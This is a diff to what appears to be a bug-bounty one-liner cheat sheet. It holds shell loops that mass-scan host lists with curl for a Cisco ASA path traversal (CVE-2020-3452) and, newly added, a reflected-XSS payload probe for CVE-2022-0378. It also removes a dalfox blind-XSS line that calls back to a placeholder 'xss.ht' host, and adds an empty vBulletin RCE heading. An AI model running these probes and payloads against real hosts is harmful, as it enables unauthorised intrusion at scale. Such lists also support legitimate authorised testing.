@@ -31,10 +31,10 @@ shodan search http.favicon.hash:-335242539 "3992" --fields ip_str,port --separat
 # CVE-2020-3452
 while read LINE; do curl -s -k "https://$LINE/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../" | grep -q "Cisco" && echo "[VULNERABLE] $LINE" || echo "[NOT VULNERABLE] $LINE"; done < HOSTS.txt
 
+# CVE-2022-0378
+cat URLS.txt | while read h; do curl -sk "$h/module/?module=admin%2Fmodules%2Fmanage&id=test%22+onmousemove%3dalert(1)+xx=%22test&from_url=x" | grep -qs "onmouse" && echo "$h: VULNERABLE"; done
 
-
-waybackurls HOST | gf xss | sed 's/=.*/=/' | sort -u | tee FILE.txt && cat FILE.txt | dalfox -b YOURS.xss.ht pipe > OUT.txt
-
+# vBulletin 5.6.2 RCE
 
 cat HOSTS.txt | getJS | httpx --match-regex "addEventListener\((?:'|\")message(?:'|\")"
 ### Prototype Pollution
